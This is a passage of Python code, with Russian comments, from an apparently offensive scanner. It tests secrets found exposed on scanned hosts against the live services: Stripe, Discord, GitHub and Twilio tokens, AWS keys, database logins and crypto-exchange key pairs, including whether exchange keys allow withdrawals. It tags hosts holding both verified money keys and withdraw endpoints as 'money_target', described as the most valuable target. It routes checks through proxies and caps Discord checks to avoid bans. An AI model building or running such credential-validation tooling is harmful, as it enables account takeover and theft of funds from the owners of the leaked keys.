                        all_patterns.append("dsn_auth_ok")
                        if severity_order.get(max_severity, 0) < 3:
                            max_severity = "CRITICAL"
                    elif chk["status"] == "reachable":
                        all_patterns.append("dsn_reachable")
                        if severity_order.get(max_severity, 0) < 1:
                            max_severity = "MEDIUM"

            # Проверка сервисных секретов: stripe (баланс!), slack, discord,
            # github, gitlab, mailgun, sendgrid, npm, dropbox (read-only)
            secret_checks: list[dict[str, Any]] = []
            if cfg.secret_checks and secrets_found:
                kind_checked: dict[str, int] = {}
                for kind, val in sorted(secrets_found)[: cfg.secret_max]:
                    # Discord банирует по rate-limit: проверяем максимум N токенов
                    # с одного хоста, остальные остаются как находки без проверки
                    if kind == "discord" and kind_checked.get("discord", 0) >= cfg.discord_verify_max:
                        continue
                    kind_checked[kind] = kind_checked.get(kind, 0) + 1
                    chk = await verify_secret(
                        session, kind, val,
                        proxy=proxy, timeout_s=max(cfg.check_timeout, 5),
                    )
                    secret_checks.append(chk)
                    if chk["status"] == "valid":
                        all_patterns.append(f"{kind}_key_valid"
                                             if kind in ("stripe", "mailgun", "sendgrid")
                                             else f"{kind}_token_valid")
                        sev = SEVERITY_MAP.get(all_patterns[-1], "HIGH")
                        if severity_order.get(sev, 0) > severity_order.get(max_severity, 0):
                            max_severity = sev

            # Twilio-пары: HTTP Basic, read-only
            twilio_checks: list[dict[str, Any]] = []
            if cfg.twilio_checks and twilio_pairs_found:
                for sid, tok in list(twilio_pairs_found)[: cfg.twilio_max]:
                    chk = await verify_twilio_pair(
                        session, sid, tok,
                        proxy=proxy, timeout_s=max(cfg.check_timeout, 5),
                    )
                    twilio_checks.append(chk)
                    if chk["status"] == "valid":
                        all_patterns.append("twilio_pair_valid")
                        if severity_order.get(SEVERITY_MAP["twilio_pair_valid"], 0) > \
                                severity_order.get(max_severity, 0):
                            max_severity = SEVERITY_MAP["twilio_pair_valid"]

            # Twitter/X app bearer
            twitter_checks: list[dict[str, Any]] = []
            if cfg.twitter_checks and twitter_bearers_found:
                for tok in list(twitter_bearers_found)[: cfg.twitter_max]:
                    chk = await verify_twitter_bearer(
                        session, tok,
                        proxy=proxy, timeout_s=max(cfg.check_timeout, 5),
                    )
                    twitter_checks.append(chk)
                    if chk["status"] == "valid":
                        all_patterns.append("twitter_token_valid")
                        if severity_order.get(SEVERITY_MAP["twitter_token_valid"], 0) > \
                                severity_order.get(max_severity, 0):
                            max_severity = SEVERITY_MAP["twitter_token_valid"]

            # Биржевые ключи: HMAC, read-only — баланс + право вывода (связка)
            exchange_checks: list[dict[str, Any]] = []
            if cfg.exchange_checks and exchange_pairs_found:
                for p in exchange_pairs_found[: cfg.exchange_max]:
                    chk = await verify_exchange_keypair(
                        session, p["exchange"], p["key"], p["secret"],
                        passphrase=p["passphrase"],
                        proxy=proxy, timeout_s=max(cfg.check_timeout, 8),
                    )
                    exchange_checks.append(chk)
                    if chk["status"] == "valid":
                        all_patterns.append("exchange_key_valid")
                        if severity_order.get(SEVERITY_MAP["exchange_key_valid"], 0) > \
                                severity_order.get(max_severity, 0):
                            max_severity = SEVERITY_MAP["exchange_key_valid"]
                        if chk.get("withdraw_enabled") is True:
                            all_patterns.append("exchange_withdraw_enabled")

            # Money-корреляция: withdraw-эндпоинты + проверенные денежные
            # ключи на одном хосте = самая ценная цель (деньги и вход в одном месте)
            money_verified = (
                any(c.get("status") == "valid" for c in exchange_checks)
                or any(c.get("status") == "valid" and c.get("money") for c in telegram_checks)
                or any(c.get("status") == "valid" and c.get("kind") == "stripe" for c in secret_checks)
                or any(c.get("status") == "auth_ok" for c in dsn_checks)
            )
            if money_verified and any(
                "withdraw_endpoint" in (ep.get("patterns") or [])
                and "withdraw_noise" not in (ep.get("patterns") or [])
                for ep in endpoints_data
            ):
                all_patterns.append("money_target")
                if severity_order.get(max_severity, 0) < 3:
                    max_severity = "CRITICAL"

            result.endpoints = endpoints_data
            result.data_patterns = list(set(all_patterns))
            result.severity = max_severity

            # Фильтруем только эндпоинты с паттернами (реальные находки)
            vulnerable_eps = [
                {
                    "path": ep["path"],
                    "method": ep["method"],
                    "status": ep["status_code"],
                    "verdict": ep["verdict"],
                    "patterns": ep["patterns"],
                    "response": ep.get("response"),
                }
                for ep in endpoints_data
                if ep.get("patterns")  # только с реальными паттернами
            ]

            # Money rule: хосты с withdraw-эндпоинтами выделяем явно
            # (HTML-заглушки не считаем - эндпоинта фактически нет)
            withdraw_eps = [
                ep for ep in vulnerable_eps
                if "withdraw_endpoint" in ep["patterns"]
                and "withdraw_noise" not in ep["patterns"]
            ]

            result.data = {
                "spec_title": result.spec_title,
                "endpoints_tested": result.total_endpoints,
                "vulnerable": vulnerable_eps,
                "withdraw_capable": bool(withdraw_eps),
                "ai_key_checks": ai_key_checks,
                "telegram_checks": telegram_checks,
                "aws_key_checks": aws_key_checks,
                "dsn_checks": dsn_checks,
                "secret_checks": secret_checks,
                "twilio_checks": twilio_checks,
                "twitter_checks": twitter_checks,
                "exchange_checks": exchange_checks,
            }

    except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
        result.is_alive = False
        result.data = {"error": type(exc).__name__}

    return result
